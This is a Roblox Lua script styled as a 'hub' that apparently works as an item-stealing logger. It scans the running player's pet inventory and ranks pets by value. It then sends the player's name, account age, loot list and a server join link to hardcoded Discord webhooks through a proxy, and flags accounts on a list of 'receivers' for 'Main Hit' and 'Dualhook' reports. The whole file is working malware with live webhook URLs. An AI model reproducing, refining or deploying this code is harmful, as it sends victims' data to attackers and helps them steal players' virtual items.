-- [[ MONDEUR HUB | MASTER FINAL V16 ]] --
-- HARDCODED PROXY: Lewisakura (Confirmed 204)
-- FEATURES: High-to-Low Sort, Fixed Values, Dualhook, Mobile Join

getgenv().WEBHOOK = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
getgenv().DUALHOOK = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
getgenv().RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
getgenv().DH_VAL = 500

if _G.MondeurV16Ran then return end
_G.MondeurV16Ran = true

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

print("--- MONDEUR DEBUG START ---")

-- [[ 1. PROXY POSTER ]] --
local function post(url, payload, label)
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    local proxyUrl = url:gsub("discord.com", "webhook.lewisakura.moe")
    
    print("Mondeur: Sending " .. label .. " via Lewisakura...")
    local success, response = pcall(function()
        return request({
            Url = proxyUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    if success and response then
        print("Mondeur: " .. label .. " Status Code: " .. tostring(response.StatusCode))
    else
        warn("Mondeur: " .. label .. " Failed to connect to Proxy.")
    end
end

-- [[ 2. MAIN TASK ]] --
task.spawn(function()
    print("Mondeur: Waiting for game data...")
    local Fsys = ReplicatedStorage:WaitForChild("Fsys", 120)
    local Fsys2 = require(Fsys)
    local DB = Fsys2.load("InventoryDB")
    local InvAPI = ReplicatedStorage.API:WaitForChild("InventoryAPI/GetInventory", 120)

    local inventory = nil
    for i = 1, 15 do
        local ok, res = pcall(function() return InvAPI:InvokeServer() end)
        if ok and res then inventory = res break end
        print("Mondeur: Retrying scan... (" .. i .. ")")
        task.wait(3)
    end

    if not inventory then warn("Mondeur: Failed to scan inventory.") return end
    print("Mondeur: Inventory scanned successfully.")

    local allPets, dhPets = {}, {}
    local totalVal, dhVal = 0, 0

    for _, item in pairs(inventory) do
        if item.Kind == "Pet" then
            local data = DB.pets[item.id]
            -- FIX: 0-Value Protection
            local val = (item.properties and item.properties.value) or (data and data.value) or 0
            local pObj = {
                name = (data and data.name) or item.id,
                val = val,
                neon = item.properties and item.properties.neon,
                mega = item.properties and item.properties.mega_neon
            }
            table.insert(allPets, pObj)
            totalVal = totalVal + val
            if val >= getgenv().DH_VAL then
                table.insert(dhPets, pObj)
                dhVal = dhVal + val
            end
        end
    end

    -- SORTING: High to Low
    table.sort(allPets, function(a, b) return a.val > b.val end)
    print("Mondeur: Found " .. #allPets .. " pets. Total Value: " .. totalVal)

    -- PLAYER DETECTION
    local receiverName = "None Online"
    for _, name in ipairs(getgenv().RECEIVERS) do
        if Players:FindFirstChild(name) then receiverName = name break end
    end

    -- PAYLOAD BUILDER
    local function getPayload(title, color, pets, val)
        local lootText = ""
        for i = 1, 20 do
            if not pets[i] then break end
            local prefix = (pets[i].mega and "🌈 ") or (pets[i].neon and "✨ ") or "🐾 "
            lootText = lootText .. prefix .. pets[i].name .. " — `" .. pets[i].val .. "`\n"
        end

        return {
            username = "Mondeur Elite",
            embeds = {{
                title = title,
                color = color,
                description = "### 📄 Player Information\n" ..
                    "👤 **User Name** : `" .. LocalPlayer.Name .. "`\n" ..
                    "🎭 **Display Name** : `" .. LocalPlayer.DisplayName .. "`\n" ..
                    "📅 **Account Age** : " .. LocalPlayer.AccountAge .. " days\n" ..
                    "😎 **Receiver** : " .. receiverName .. "\n" ..
                    "💰 **Total Value** : `" .. val .. "`\n\n" ..
                    "### 📡 Player Status\n" ..
                    "🟢 **Status**: `Connected & Active`\n\n" ..
                    "### 📦 Loot Summary\n" ..
                    "```\n" .. (lootText ~= "" and lootText or "Empty") .. "```\n" ..
                    "**Total Items:** `" .. #pets .. "`\n\n" ..
                    "### 👥 Join Player\n" ..
                    "[**Join Server Instance**](roblox://placeID=920587237&gameInstanceId=" .. game.JobId .. ")",
                footer = { text = "Mondeur Elite V16 | " .. os.date("%X") },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
    end

    -- SENDING
    post(getgenv().WEBHOOK, getPayload("MondeurOnTop • Main Hit [ 🌊 ]", 0x3498db, allPets, totalVal), "Main Hit")
    
    if #dhPets > 0 then
        task.wait(2)
        post(getgenv().DUALHOOK, getPayload("MondeurOnTop • Dualhook Hit [ 💎 ]", 0x9b59b6, dhPets, dhVal), "Dualhook")
    end
    print("--- MONDEUR DEBUG END ---")
end)
